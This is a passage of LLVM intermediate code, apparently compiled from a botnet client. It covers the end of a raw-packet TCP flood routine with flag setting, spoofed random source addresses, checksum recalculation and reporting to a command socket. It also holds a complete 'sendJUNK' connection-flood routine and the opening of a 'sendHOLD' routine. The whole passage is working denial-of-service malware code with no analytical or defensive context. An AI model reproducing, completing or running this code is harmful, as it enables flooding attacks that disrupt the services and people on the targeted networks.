  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i64 0, i64 0)) #11
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %156, label %120

120:                                              ; preds = %73
  %121 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = and i16 %125, -513
  %127 = or i16 %126, 512
  store i16 %127, i16* %124, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon* %129 to %struct.anon.0*
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 4
  %132 = load i16, i16* %131, align 4
  %133 = and i16 %132, -1025
  %134 = or i16 %133, 1024
  store i16 %134, i16* %131, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon* %136 to %struct.anon.0*
  %138 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %137, i32 0, i32 4
  %139 = load i16, i16* %138, align 4
  %140 = and i16 %139, -257
  %141 = or i16 %140, 256
  store i16 %141, i16* %138, align 4
  %142 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon* %143 to %struct.anon.0*
  %145 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -4097
  %148 = or i16 %147, 4096
  store i16 %148, i16* %145, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 4
  %153 = load i16, i16* %152, align 4
  %154 = and i16 %153, -2049
  %155 = or i16 %154, 2048
  store i16 %155, i16* %152, align 4
  br label %233

156:                                              ; preds = %73
  %157 = load i8*, i8** %12, align 8
  %158 = call i8* @strtok(i8* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %158, i8** %24, align 8
  br label %159

159:                                              ; preds = %230, %156
  %160 = load i8*, i8** %24, align 8
  %161 = icmp ne i8* %160, null
  br i1 %161, label %162, label %232

162:                                              ; preds = %159
  %163 = load i8*, i8** %24, align 8
  %164 = call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i64 0, i64 0)) #11
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %174, label %166

166:                                              ; preds = %162
  %167 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon* %168 to %struct.anon.0*
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 4
  %171 = load i16, i16* %170, align 4
  %172 = and i16 %171, -513
  %173 = or i16 %172, 512
  store i16 %173, i16* %170, align 4
  br label %230

174:                                              ; preds = %162
  %175 = load i8*, i8** %24, align 8
  %176 = call i32 @strcmp(i8* %175, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i64 0, i64 0)) #11
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %186, label %178

178:                                              ; preds = %174
  %179 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon* %180 to %struct.anon.0*
  %182 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = and i16 %183, -1025
  %185 = or i16 %184, 1024
  store i16 %185, i16* %182, align 4
  br label %229

186:                                              ; preds = %174
  %187 = load i8*, i8** %24, align 8
  %188 = call i32 @strcmp(i8* %187, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i64 0, i64 0)) #11
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %198, label %190

190:                                              ; preds = %186
  %191 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon* %192 to %struct.anon.0*
  %194 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -257
  %197 = or i16 %196, 256
  store i16 %197, i16* %194, align 4
  br label %228

198:                                              ; preds = %186
  %199 = load i8*, i8** %24, align 8
  %200 = call i32 @strcmp(i8* %199, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #11
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %210, label %202

202:                                              ; preds = %198
  %203 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon* %204 to %struct.anon.0*
  %206 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = and i16 %207, -4097
  %209 = or i16 %208, 4096
  store i16 %209, i16* %206, align 4
  br label %227

210:                                              ; preds = %198
  %211 = load i8*, i8** %24, align 8
  %212 = call i32 @strcmp(i8* %211, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i64 0, i64 0)) #11
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %222, label %214

214:                                              ; preds = %210
  %215 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon* %216 to %struct.anon.0*
  %218 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %219, -2049
  %221 = or i16 %220, 2048
  store i16 %221, i16* %218, align 4
  br label %226

222:                                              ; preds = %210
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = load i8*, i8** %24, align 8
  %225 = call i32 (i32, i8*, ...) @sockprintf(i32 %223, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i64 0, i64 0), i8* %224)
  br label %226

226:                                              ; preds = %222, %214
  br label %227

227:                                              ; preds = %226, %202
  br label %228

228:                                              ; preds = %227, %190
  br label %229

229:                                              ; preds = %228, %178
  br label %230

230:                                              ; preds = %229, %166
  %231 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %231, i8** %24, align 8
  br label %159, !llvm.loop !45

232:                                              ; preds = %159
  br label %233

233:                                              ; preds = %232, %120
  %234 = call i32 @rand_cmwc()
  %235 = trunc i32 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 5
  store i16 %235, i16* %239, align 2
  %240 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 6
  store i16 0, i16* %243, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load i32, i32* %9, align 4
  %249 = icmp eq i32 %248, 0
  br i1 %249, label %250, label %252

250:                                              ; preds = %233
  %251 = call i32 @rand_cmwc()
  br label %257

252:                                              ; preds = %233
  %253 = load i32, i32* %9, align 4
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #15
  %256 = zext i16 %255 to i32
  br label %257

257:                                              ; preds = %252, %250
  %258 = phi i32 [ %251, %250 ], [ %256, %252 ]
  %259 = trunc i32 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 1
  store i16 %259, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %265 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %266 = call zeroext i16 @tcpcsum(%struct.iphdr* %264, %struct.tcphdr* %265)
  %267 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon* %268 to %struct.anon.0*
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 6
  store i16 %266, i16* %270, align 4
  %271 = bitcast i8* %78 to i16*
  %272 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 2
  %274 = load i16, i16* %273, align 2
  %275 = zext i16 %274 to i32
  %276 = call zeroext i16 @csum(i16* %271, i32 %275)
  %277 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 %276, i16* %278, align 2
  %279 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %280 = load i32, i32* %10, align 4
  %281 = add nsw i32 %279, %280
  store i32 %281, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %282

282:                                              ; preds = %335, %334, %257
  br label %283

283:                                              ; preds = %282
  %284 = load i32, i32* %17, align 4
  %285 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %286 = call i64 @sendto(i32 %284, i8* %78, i64 %76, i32 0, %struct.sockaddr* %285, i32 16)
  %287 = load i32, i32* %19, align 4
  %288 = call i32 @getRandomIP(i32 %287)
  %289 = call i32 @htonl(i32 %288) #15
  %290 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 8
  store i32 %289, i32* %291, align 4
  %292 = call i32 @rand_cmwc()
  %293 = trunc i32 %292 to i16
  %294 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 0
  %299 = bitcast %union.anon* %298 to %struct.anon.0*
  %300 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %299, i32 0, i32 2
  store i32 %296, i32* %300, align 4
  %301 = call i32 @rand_cmwc()
  %302 = trunc i32 %301 to i16
  %303 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon* %304 to %struct.anon.0*
  %306 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %305, i32 0, i32 0
  store i16 %302, i16* %306, align 4
  %307 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon* %308 to %struct.anon.0*
  %310 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %309, i32 0, i32 6
  store i16 0, i16* %310, align 4
  %311 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %312 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %313 = call zeroext i16 @tcpcsum(%struct.iphdr* %311, %struct.tcphdr* %312)
  %314 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon* %315 to %struct.anon.0*
  %317 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %316, i32 0, i32 6
  store i16 %313, i16* %317, align 4
  %318 = bitcast i8* %78 to i16*
  %319 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 2
  %321 = load i16, i16* %320, align 2
  %322 = zext i16 %321 to i32
  %323 = call zeroext i16 @csum(i16* %318, i32 %322)
  %324 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 7
  store i16 %323, i16* %325, align 2
  %326 = load i32, i32* %26, align 4
  %327 = load i32, i32* %15, align 4
  %328 = icmp eq i32 %326, %327
  br i1 %328, label %329, label %335

329:                                              ; preds = %283
  %330 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %331 = load i32, i32* %25, align 4
  %332 = icmp sgt i32 %330, %331
  br i1 %332, label %333, label %334

333:                                              ; preds = %329
  br label %338

334:                                              ; preds = %329
  store i32 0, i32* %26, align 4
  br label %282

335:                                              ; preds = %283
  %336 = load i32, i32* %26, align 4
  %337 = add i32 %336, 1
  store i32 %337, i32* %26, align 4
  br label %282

338:                                              ; preds = %333
  %339 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %339)
  br label %340

340:                                              ; preds = %338, %60, %52, %45
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendJUNK(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.fd_set*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %21 = call i32 @getdtablesize() #12
  %22 = sdiv i32 %21, 2
  store i32 %22, i32* %7, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = load i32, i32* %5, align 4
  %25 = trunc i32 %24 to i16
  %26 = call zeroext i16 @htons(i16 zeroext %25) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = load i8*, i8** %4, align 8
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %30 = call i32 @getHost(i8* %28, %struct.in_addr* %29)
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %33

32:                                               ; preds = %3
  br label %233

33:                                               ; preds = %3
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %35, i8 0, i64 8, i1 false)
  %36 = load i32, i32* %7, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %10, align 8
  %39 = alloca %struct.state_t, i64 %37, align 16
  store i64 %37, i64* %11, align 8
  %40 = bitcast %struct.state_t* %39 to i8*
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %40, i8 0, i64 %43, i1 false)
  %44 = call noalias align 16 i8* @malloc(i64 1024) #12
  store i8* %44, i8** %17, align 8
  %45 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %45, i8 0, i64 1024, i1 false)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %46, %47
  store i32 %48, i32* %18, align 4
  br label %49

49:                                               ; preds = %230, %33
  %50 = load i32, i32* %18, align 4
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %52 = icmp sgt i32 %50, %51
  br i1 %52, label %53, label %231

53:                                               ; preds = %49
  store i32 0, i32* %8, align 4
  br label %54

54:                                               ; preds = %227, %53
  %55 = load i32, i32* %8, align 4
  %56 = load i32, i32* %7, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %230

58:                                               ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %60
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %61, i32 0, i32 1
  %63 = load i8, i8* %62, align 4
  %64 = zext i8 %63 to i32
  switch i32 %64, label %226 [
    i32 0, label %65
    i32 1, label %109
    i32 2, label %200
  ]

65:                                               ; preds = %58
  %66 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %67 = load i32, i32* %8, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %68
  %70 = getelementptr inbounds %struct.state_t, %struct.state_t* %69, i32 0, i32 0
  store i32 %66, i32* %70, align 8
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %72
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 8
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %77
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = call i32 (i32, i32, ...) @fcntl(i32 %80, i32 3, i8* null)
  %82 = or i32 %81, 2048
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %75, i32 4, i32 %82)
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %90 = call i32 @connect(i32 %88, %struct.sockaddr* %89, i32 16)
  %91 = icmp ne i32 %90, -1
  br i1 %91, label %96, label %92

92:                                               ; preds = %65
  %93 = call i32* @__errno_location() #15
  %94 = load i32, i32* %93, align 4
  %95 = icmp ne i32 %94, 115
  br i1 %95, label %96, label %103

96:                                               ; preds = %92, %65
  %97 = load i32, i32* %8, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %98
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %99, i32 0, i32 0
  %101 = load i32, i32* %100, align 8
  %102 = call i32 @close(i32 %101)
  br label %108

103:                                              ; preds = %92
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 1
  store i8 1, i8* %107, align 4
  br label %108

108:                                              ; preds = %103, %96
  br label %226

109:                                              ; preds = %58
  br label %110

110:                                              ; preds = %109
  store %struct.fd_set* %12, %struct.fd_set** %20, align 8
  store i32 0, i32* %19, align 4
  br label %111

111:                                              ; preds = %121, %110
  %112 = load i32, i32* %19, align 4
  %113 = zext i32 %112 to i64
  %114 = icmp ult i64 %113, 16
  br i1 %114, label %115, label %124

115:                                              ; preds = %111
  %116 = load %struct.fd_set*, %struct.fd_set** %20, align 8
  %117 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %116, i32 0, i32 0
  %118 = load i32, i32* %19, align 4
  %119 = zext i32 %118 to i64
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %117, i64 0, i64 %119
  store i64 0, i64* %120, align 8
  br label %121

121:                                              ; preds = %115
  %122 = load i32, i32* %19, align 4
  %123 = add i32 %122, 1
  store i32 %123, i32* %19, align 4
  br label %111, !llvm.loop !46

124:                                              ; preds = %111
  br label %125

125:                                              ; preds = %124
  br label %126

126:                                              ; preds = %125
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %128
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = srem i32 %131, 64
  %133 = zext i32 %132 to i64
  %134 = shl i64 1, %133
  %135 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %137
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 8
  %141 = sdiv i32 %140, 64
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [16 x i64], [16 x i64]* %135, i64 0, i64 %142
  %144 = load i64, i64* %143, align 8
  %145 = or i64 %144, %134
  store i64 %145, i64* %143, align 8
  %146 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %146, align 8
  %147 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %147, align 8
  %148 = load i32, i32* %8, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %149
  %151 = getelementptr inbounds %struct.state_t, %struct.state_t* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = add nsw i32 %152, 1
  %154 = call i32 @select(i32 %153, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %154, i32* %16, align 4
  %155 = load i32, i32* %16, align 4
  %156 = icmp eq i32 %155, 1
  br i1 %156, label %157, label %184

157:                                              ; preds = %126
  store i32 4, i32* %14, align 4
  %158 = load i32, i32* %8, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %159
  %161 = getelementptr inbounds %struct.state_t, %struct.state_t* %160, i32 0, i32 0
  %162 = load i32, i32* %161, align 8
  %163 = bitcast i32* %15 to i8*
  %164 = call i32 @getsockopt(i32 %162, i32 1, i32 4, i8* %163, i32* %14) #12
  %165 = load i32, i32* %15, align 4
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %178

167:                                              ; preds = %157
  %168 = load i32, i32* %8, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %169
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %170, i32 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = call i32 @close(i32 %172)
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 1
  store i8 0, i8* %177, align 4
  br label %183

178:                                              ; preds = %157
  %179 = load i32, i32* %8, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %180
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %181, i32 0, i32 1
  store i8 2, i8* %182, align 4
  br label %183

183:                                              ; preds = %178, %167
  br label %199

184:                                              ; preds = %126
  %185 = load i32, i32* %16, align 4
  %186 = icmp eq i32 %185, -1
  br i1 %186, label %187, label %198

187:                                              ; preds = %184
  %188 = load i32, i32* %8, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %189
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 8
  %193 = call i32 @close(i32 %192)
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %195
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %196, i32 0, i32 1
  store i8 0, i8* %197, align 4
  br label %198

198:                                              ; preds = %187, %184
  br label %199

199:                                              ; preds = %198, %183
  br label %226

200:                                              ; preds = %58
  %201 = load i8*, i8** %17, align 8
  call void @makeRandomStr(i8* %201, i32 1024)
  %202 = load i32, i32* %8, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %203
  %205 = getelementptr inbounds %struct.state_t, %struct.state_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 8
  %207 = load i8*, i8** %17, align 8
  %208 = call i64 @send(i32 %206, i8* %207, i64 1024, i32 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %225

210:                                              ; preds = %200
  %211 = call i32* @__errno_location() #15
  %212 = load i32, i32* %211, align 4
  %213 = icmp ne i32 %212, 11
  br i1 %213, label %214, label %225

214:                                              ; preds = %210
  %215 = load i32, i32* %8, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %216
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 8
  %220 = call i32 @close(i32 %219)
  %221 = load i32, i32* %8, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %222
  %224 = getelementptr inbounds %struct.state_t, %struct.state_t* %223, i32 0, i32 1
  store i8 0, i8* %224, align 4
  br label %225

225:                                              ; preds = %214, %210, %200
  br label %226

226:                                              ; preds = %58, %225, %199, %108
  br label %227

227:                                              ; preds = %226
  %228 = load i32, i32* %8, align 4
  %229 = add nsw i32 %228, 1
  store i32 %229, i32* %8, align 4
  br label %54, !llvm.loop !47

230:                                              ; preds = %54
  br label %49, !llvm.loop !48

231:                                              ; preds = %49
  %232 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %232)
  br label %233

233:                                              ; preds = %231, %32
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendHOLD(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.fd_set*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.fd_set*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %23 = call i32 @getdtablesize() #12
  %24 = sdiv i32 %23, 2
  store i32 %24, i32* %7, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %5, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 zeroext %27) #15
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %32 = call i32 @getHost(i8* %30, %struct.in_addr* %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %3
  br label %269

35:                                               ; preds = %3
